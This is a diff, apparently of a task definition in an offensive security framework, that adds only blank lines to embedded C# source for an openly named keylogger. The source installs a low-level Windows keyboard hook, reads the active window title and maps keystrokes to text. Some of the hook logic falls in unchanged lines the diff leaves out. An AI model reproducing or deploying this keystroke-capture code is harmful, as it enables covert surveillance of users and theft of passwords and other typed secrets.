@@ -37,6 +37,7 @@ csharp:
     using System.Collections.Generic;
     using System.Runtime.InteropServices;
     using Forms = System.Windows.Forms;
+
     public static class Program
     {
         public static void Main(string[] args)
@@ -47,12 +48,15 @@ csharp:
             Console.WriteLine(result);
         }
     }
+
     public class Keylogger
     {
         private static HookProc hookproc;
+
         public static string StartKeylogger(int Seconds)
         {
             Console.WriteLine(String.Format("Starting keylogger for {0} seconds.", Seconds));
+
             IntPtr HookID = IntPtr.Zero;
             string PreviousActiveWindow = "";
             hookproc = (nCode, wParam, lParam) =>
@@ -120,34 +124,46 @@ csharp:
             }
             return "";
         }
+
         private static int WH_KEYBOARD_LL { get; } = 13;
         private static int WM_KEYDOWN { get; } = 0x0100;
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern int GetKeyState(int nVirtKey);
+
         [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetForegroundWindow();
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
         private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
         private static string GetActiveWindowTitle()
         {
             const int capacity = 256;
             StringBuilder builder = new StringBuilder(capacity);
             IntPtr handle = GetForegroundWindow();
+
             if (GetWindowText(handle, builder, capacity) > 0)
             {
                 return builder.ToString();
             }
             return null;
         }
+
         private static IDictionary<Keys, string> KeyDict { get; } = new Dictionary<Keys, string>
         {
             { Keys.Attn, "[Attn]" },
@@ -211,6 +227,7 @@ csharp:
             { Keys.NumPad8, "8" },
             { Keys.NumPad9, "9" },
         };
+
         private static IDictionary<Keys, string> KeyDictShift { get; } = new Dictionary<Keys, string>
         {
             { Keys.D0, ")" },
@@ -234,6 +251,7 @@ csharp:
             { Keys.OemCloseBrackets, "}" },
             { Keys.OemOpenBrackets, "{" }
         };
+
         [Flags]
         private enum Keys
         {
@@ -351,6 +369,7 @@ csharp:
             LControlKey = 162,
             RControlKey = 163,
         }
+
         [StructLayout(LayoutKind.Sequential)]
         internal struct KbDllHookStruct
         {
